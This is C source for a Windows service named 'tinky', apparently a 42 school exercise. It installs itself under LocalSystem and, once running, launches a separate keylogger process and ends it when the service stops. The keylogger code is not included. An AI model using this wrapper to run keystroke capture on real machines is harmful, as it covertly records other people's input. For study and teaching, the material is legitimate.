#include "../../inc/service_manager.h"

#pragma comment(lib, "advapi32.lib")

// Global variable definitions
SERVICE_STATUS gSvcStatus = {0};
SERVICE_STATUS_HANDLE gSvcStatusHandle = NULL;
HANDLE ghSvcStopEvent = NULL;
TCHAR szCommand[10] = {0};
TCHAR szSvcName[80] = {0};
PROCESS_INFORMATION gKeyloggerProcessInfo = {0};

int __cdecl _tmain(int argc, TCHAR *argv[]) 
{
    // Initialize service name to "tinky"
    StringCchCopy(szSvcName, 80, SVCNAME);

    if (argc == 1)
    {
        // The service is probably being started by the SCM
        SERVICE_TABLE_ENTRY DispatchTable[] = 
        { 
            { szSvcName, (LPSERVICE_MAIN_FUNCTION) SvcMain }, 
            { NULL, NULL } 
        };

        if (!StartServiceCtrlDispatcher(DispatchTable)) 
        { 
            _tprintf(TEXT("Error: Could not start as service. Available commands:\n"));
            DisplayUsage();
            SvcReportEvent(TEXT("StartServiceCtrlDispatcher")); 
        } 
        return 0;
    }

    // Handle management commands
    _tprintf(TEXT("\n"));
    if( argc != 2 )
    {
        _tprintf(TEXT("ERROR: Incorrect number of arguments\n\n"));
        DisplayUsage();
        return 1;
    }

    StringCchCopy(szCommand, 10, argv[1]);

    if(lstrcmpi( szCommand, TEXT("install")) == 0 )
    {
        SvcInstall();
    }
    else if (lstrcmpi( szCommand, TEXT("start")) == 0 )
    {
        DoStartSvc();
    }
    else if (lstrcmpi( szCommand, TEXT("stop")) == 0 )
    {
        DoStopSvc();
    }
    else if (lstrcmpi( szCommand, TEXT("delete")) == 0 )
    {
        DoDeleteSvc();
    }
    else 
    {
        _tprintf(TEXT("Unknown command (%s)\n\n"), szCommand);
        DisplayUsage();
        return 1;
    }

    return 0;
}

VOID SvcInstall()
{
    SC_HANDLE schSCManager;
    SC_HANDLE schService;
    TCHAR szUnquotedPath[MAX_PATH];

    if( !GetModuleFileName( NULL, szUnquotedPath, MAX_PATH ) )
    {
        _tprintf(TEXT("Cannot install service (%d)\n"), GetLastError());
        return;
    }

    TCHAR szPath[MAX_PATH];
    StringCbPrintf(szPath, MAX_PATH, TEXT("\"%s\""), szUnquotedPath);

    schSCManager = OpenSCManager( 
        NULL,
        NULL,
        SC_MANAGER_ALL_ACCESS);  

    if (NULL == schSCManager) 
    {
        _tprintf(TEXT("OpenSCManager failed (%d)\n"), GetLastError());
        return;
    }

    schService = CreateService( 
        schSCManager,              // SCM database 
        szSvcName,                 // name of service 
        szSvcName,                 // service name to display 
        SERVICE_ALL_ACCESS,        // desired access 
        SERVICE_WIN32_OWN_PROCESS, // service type 
        SERVICE_DEMAND_START,      // start type 
        SERVICE_ERROR_NORMAL,      // error control type 
        szPath,                    // path to service's binary 
        NULL,                      // no load ordering group 
        NULL,                      // no tag identifier 
        NULL,                      // no dependencies 
        NULL,                      // LocalSystem account 
        NULL);                     // no password 

    if (schService == NULL) 
    {
        _tprintf(TEXT("CreateService failed (%d)\n"), GetLastError()); 
        CloseServiceHandle(schSCManager);
        return;
    }
    else _tprintf(TEXT("Service installed successfully\n")); 

    CloseServiceHandle(schService); 
    CloseServiceHandle(schSCManager);
}

VOID WINAPI SvcMain( DWORD dwArgc, LPTSTR *lpszArgv )
{
    // Register the handler function for the service
    gSvcStatusHandle = RegisterServiceCtrlHandler( 
        szSvcName,
        SvcCtrlHandler);

    if( !gSvcStatusHandle )
    { 
        SvcReportEvent(TEXT("RegisterServiceCtrlHandler")); 
        return; 
    } 

    // SERVICE_STATUS members
    gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; 
    gSvcStatus.dwServiceSpecificExitCode = 0;    

    // Report initial status to the SCM
    ReportSvcStatus( SERVICE_START_PENDING, NO_ERROR, 3000 );

    // Perform service-specific initialization and work.
    SvcInit( dwArgc, lpszArgv );
}

VOID SvcInit( DWORD dwArgc, LPTSTR *lpszArgv)
{
    // Mark unused parameters to avoid warnings
    UNREFERENCED_PARAMETER(dwArgc);
    UNREFERENCED_PARAMETER(lpszArgv);

    // Create an event. The control handler function, SvcCtrlHandler,
    // signals this event when it receives the stop control code.
    ghSvcStopEvent = CreateEvent(
                         NULL,    // default security attributes
                         TRUE,    // manual reset event
                         FALSE,   // not signaled
                         NULL);   // no name

    if ( ghSvcStopEvent == NULL)
    {
        ReportSvcStatus( SERVICE_STOPPED, GetLastError(), 0 );
        return;
    }

    // Report running status when initialization is complete.
    ReportSvcStatus( SERVICE_RUNNING, NO_ERROR, 0 );

    _tprintf(TEXT("Service initialized and running\n"));


    if (!LaunchKeylogger())
    {
        _tprintf(TEXT("Failed to launch keylogger\n"));
        SvcReportEvent(TEXT("LaunchKeylogger"));
    }
    else
    {
        _tprintf(TEXT("Keylogger launched successfully\n"));
    }

    // Check whether to stop the service.
    while(1)
    {
         // Wait for the stop signal
        WaitForSingleObject(ghSvcStopEvent, INFINITE);

        _tprintf(TEXT("Service stop signal received\n"));
        
        // Terminate keylogger when service stops
        TerminateKeylogger();
        
        ReportSvcStatus( SERVICE_STOPPED, NO_ERROR, 0 );
        break;
    }
}

VOID ReportSvcStatus( DWORD dwCurrentState,
                      DWORD dwWin32ExitCode,
                      DWORD dwWaitHint)
{
    static DWORD dwCheckPoint = 1;

     // Fill in the SERVICE_STATUS structure.
    gSvcStatus.dwCurrentState = dwCurrentState;
    gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
    gSvcStatus.dwWaitHint = dwWaitHint;

    if (dwCurrentState == SERVICE_START_PENDING)
        gSvcStatus.dwControlsAccepted = 0;
    else gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    if ( (dwCurrentState == SERVICE_RUNNING) ||
           (dwCurrentState == SERVICE_STOPPED) )
        gSvcStatus.dwCheckPoint = 0;
    else gSvcStatus.dwCheckPoint = dwCheckPoint++;

    // Report the status of the service to the SCM.
    SetServiceStatus( gSvcStatusHandle, &gSvcStatus );
}

VOID WINAPI SvcCtrlHandler( DWORD dwCtrl )
{
    // Handle the requested control code.
   switch(dwCtrl) 
   {  
      case SERVICE_CONTROL_STOP: 
         ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);

         // Signal the service to stop.
         SetEvent(ghSvcStopEvent);
         ReportSvcStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0);
         return;
 
      case SERVICE_CONTROL_INTERROGATE: 
         break; 
 
      default: 
         break;
   } 
}

VOID SvcReportEvent(LPTSTR szFunction) 
{ 
    HANDLE hEventSource;
    LPCTSTR lpszStrings[2];
    TCHAR Buffer[80];

    hEventSource = RegisterEventSource(NULL, szSvcName);

    if( NULL != hEventSource )
    {
        StringCchPrintf(Buffer, 80, TEXT("%s failed with %d"), szFunction, GetLastError());

        lpszStrings[0] = szSvcName;
        lpszStrings[1] = Buffer;

        ReportEvent(hEventSource,        // event log handle
                    EVENTLOG_ERROR_TYPE, // event type
                    0,                   // event category
                    0,                   // event identifier
                    NULL,                // no security identifier
                    2,                   // size of lpszStrings array
                    0,                   // no binary data
                    lpszStrings,         // array of strings
                    NULL);               // no binary data

        DeregisterEventSource(hEventSource);
    }
}

VOID __stdcall DisplayUsage()
{
    _tprintf(TEXT("tinky Service - 42 Project\n\n"));
    _tprintf(TEXT("Usage:\n"));
    _tprintf(TEXT("  As Service:  svc.exe                    (run as service)\n"));
    _tprintf(TEXT("  Install:     svc.exe install            (install service)\n"));
    _tprintf(TEXT("  Management:  svc.exe [command]\n"));
    _tprintf(TEXT("\nManagement Commands:\n"));
    _tprintf(TEXT("  start     - Start the service\n"));
    _tprintf(TEXT("  stop      - Stop the service\n"));
    _tprintf(TEXT("  delete    - Remove service\n"));
}
